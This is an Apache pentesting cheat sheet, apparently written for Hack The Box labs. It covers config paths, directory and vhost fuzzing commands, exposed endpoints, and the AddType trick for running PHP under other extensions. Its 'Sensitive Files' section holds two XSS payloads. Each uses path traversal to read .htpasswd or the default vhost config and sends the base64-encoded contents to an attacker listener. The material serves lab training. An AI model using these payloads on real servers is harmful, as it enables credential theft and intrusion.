---
icon: helicopter
---

# Apache

{% hint style="info" %}
<mark style="color:purple;">It uses a process-based model, where each request is handled by a separate thread or process, which can be resource-heavy under high traffic but provides great compatibility.</mark>
{% endhint %}

<details>

<summary><mark style="color:purple;"><strong><code>Configuration Files</code></strong></mark> </summary>

{% code title="Standard" %}
```
/etc/apache2/apache2.conf
```
{% endcode %}

{% code title="RHEL" %}
```
/etc/httpd/httpd.conf
```
{% endcode %}

{% code title="FreeBSD" %}
```
/etc/apache24/httpd.conf
```
{% endcode %}

{% code title="vhost" %}
```
/etc/apache2/sites-enabled/000-default.conf
```
{% endcode %}

{% code title="Modules" %}
```
/etc/apache2/mods-available/
```
{% endcode %}

</details>

<details>

<summary><mark style="color:purple;"><strong><code>Initial Recon</code></strong></mark></summary>

* <mark style="color:purple;">If you are lucky you may be able to find</mark> <mark style="color:orange;">**`/sites-enabled`**</mark> <mark style="color:purple;">and</mark> <mark style="color:orange;">**`/sites-available`**</mark> <mark style="color:purple;">or even</mark> <mark style="color:orange;">**`logs`**</mark><mark style="color:purple;">:</mark>&#x20;

{% code overflow="wrap" %}
```shell
feroxbuster -u http://URL.htb -w ~/Documents/Wordlists/default-web-root-directory-linux.txt --output urls.txt --redirects
```
{% endcode %}

* <mark style="color:orange;">**`robots.txt`**</mark> <mark style="color:purple;">can reveal pages that the server is hiding.</mark>
* <mark style="color:purple;">Fuzz for</mark> <mark style="color:orange;">**`vhosts`**</mark> <mark style="color:purple;">at sight of</mark> <mark style="color:orange;">**`301`**</mark> <mark style="color:purple;">responses.</mark>

{% code title="Ffuf" overflow="wrap" %}
```bash
ffuf -c -w ~/Documents/Wordlists/subdomains-top1million-20000.txt -u http://SITE/ -H "Host: FUZZ.URL.htb" -fc 301 -ac
```
{% endcode %}

* <mark style="color:orange;">**`/cgi-bin/`**</mark><mark style="color:purple;">: Directory for executing</mark> <mark style="color:orange;">**`CGI`**</mark> <mark style="color:purple;">scripts.</mark>

- <mark style="color:orange;">**`/icons/`**</mark><mark style="color:purple;">: Often used for directory listings. It may expose unintended file paths.</mark>
- <mark style="color:orange;">**`phpinfo.php`**</mark><mark style="color:purple;">: Disclose sensitive server and PHP configuration details.</mark>

</details>

<details>

<summary><mark style="color:purple;"><strong><code>Authentication/Authorization</code></strong></mark></summary>

#### <mark style="color:red;">**`Authentication`**</mark>

* <mark style="color:orange;">**`.htaccess`**</mark><mark style="color:purple;">: Configures directory-specific rules for authentication and other settings.</mark>
* <mark style="color:orange;">**`.htpasswd`**</mark><mark style="color:purple;">: Stores user credentials for basic authentication.</mark>

</details>

<details>

<summary><mark style="color:purple;"><strong><code>Standard Modules</code></strong></mark></summary>

{% hint style="info" %}


#### <mark style="color:red;">**`mod_status`**</mark>&#x20;

<mark style="color:orange;">**`/server-status`**</mark><mark style="color:purple;">: Real-time status and diagnostic information about the server, including active requests, resource usage, and server performance.</mark>

<mark style="color:orange;">**`/server-info`**</mark><mark style="color:purple;">: Server health and performance monitoring.</mark>
{% endhint %}

</details>

<details>

<summary><mark style="color:orange;"><strong><code>PHP</code></strong></mark> <mark style="color:purple;"><strong><code>Modules</code></strong></mark></summary>

<mark style="color:purple;">To Allow</mark> <mark style="color:orange;">**`PHP`**</mark> <mark style="color:purple;">execution you need to add this line to</mark> <mark style="color:orange;">**`/etc/apache2/apache2.conf`**</mark><mark style="color:purple;">:</mark>

{% code overflow="wrap" %}
```apacheconf
LoadModule php_module /usr/lib/apache2/modules/libphp.so
    AddType application/x-httpd-php .php
```
{% endcode %}

* <mark style="color:purple;">You can actually add any extension that you want:</mark>

```
AddType application/x-httpd-php .l33t
```

</details>

<details>

<summary><mark style="color:red;"><strong><code>Sensitive Files</code></strong></mark></summary>

{% code title="Authorization File" overflow="wrap" %}
```javascript
var req = new XMLHttpRequest();
req.open('GET', 'http://alert.htb/messages.php?file=../../../../../var/www/statistics.alert.htb/.htpasswd', false);
req.send();
var req2 = new XMLHttpRequest();
req2.open('GET', 'http://10.10.14.162:3000/?content=' + btoa(req.responseText),
true);
req2.send();
```
{% endcode %}

{% code title="Default config file" overflow="wrap" %}
```javascript
var req = new XMLHttpRequest();
req.open('GET', 'http://alert.htb/messages.php?file=../../../../../etc/apache2/sites-available/000-default.conf', false);
req.send();
var req2 = new XMLHttpRequest();
req2.open('GET', 'http://10.10.14.162:3000/?content=' + btoa(req.responseText),
true);
req2.send();
```
{% endcode %}

{% hint style="info" %}
<mark style="color:red;">**`Logs`**</mark>

* <mark style="color:purple;">Access Logs:</mark>
  * <mark style="color:orange;">**`/var/log/apache2/access.log`**</mark>
  * <mark style="color:orange;">**`/var/log/httpd/access_log`**</mark>
* <mark style="color:purple;">Error logs:</mark>
  * <mark style="color:orange;">**`/var/log/apache2/error.log`**</mark>
  * <mark style="color:orange;">**`/var/log/httpd/error_log`**</mark>
{% endhint %}

</details>
